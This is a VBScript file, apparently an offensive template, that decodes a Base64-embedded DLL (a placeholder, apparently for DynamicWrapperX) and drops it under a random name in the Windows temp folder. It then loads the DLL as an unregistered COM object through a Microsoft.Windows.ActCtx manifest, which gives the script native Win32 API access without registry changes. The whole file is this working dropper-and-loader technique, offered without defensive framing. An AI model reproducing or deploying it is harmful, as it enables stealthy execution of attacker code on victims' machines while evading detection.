Function decodeBase64(base64)
	dim DM, EL
	Set DM = CreateObject("Microsoft.XMLDOM")
	' Create temporary node with Base64 data type
	Set EL = DM.createElement("tmp")
	EL.DataType = "bin.base64"
	' Set encoded String, get bytes
	EL.Text = base64
	decodeBase64 = EL.NodeTypedValue
End Function

Function RandomString(ByVal strLen)
    Dim str, min, max

    LETTERS = Array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9")
    Randomize
    For i = 1 To strLen
        str = str & LETTERS(Int(UBound(LETTERS) * Rnd))
    Next
    RandomString = str
End Function

Sub writeBytes(file, bytes)
	Dim binaryStream
	Const TypeBinary = 1
	Const ForReading = 1, ForWriting = 2, ForAppending = 8
	Set binaryStream = CreateObject("ADODB.Stream")
	binaryStream.Type = TypeBinary
	'Open the stream and write binary data
	binaryStream.Open
	binaryStream.Write bytes
	'Save binary data to disk
	binaryStream.SaveToFile file, ForWriting
End Sub


fileName = RandomString(12) + "." + RandomString(3)
classObj = RandomString(12)
manifest = "<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?> <assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0""> 	<assemblyIdentity type=""win32"" name=""" + classObj + """ version=""2.2.0.0""/> 	<file name=""" + fileName + """>     	<comClass         	description=""" + classObj + " Class""         	clsid=""{89565276-A714-4a43-912E-978B935EDCCC}""         	threadingModel=""Both""         	progid=""" + classObj + """/> 	</file>  </assembly>"
Set SFSO = CreateObject("Scripting.FileSystemObject")
dropPath = SFSO.GetSpecialFolder(2)
dynwrapX = "B64_DLL_BYTES_GO_HERE"


dynwrapXBytes = decodeBase64(dynwrapX)
finalPath = dropPath + "\" + fileName
writeBytes finalPath, dynwrapXBytes


Set ax = CreateObject("Microsoft.Windows.ActCtx")
ax.ManifestText = manifest

Set DWX = ax.CreateObject(classObj)
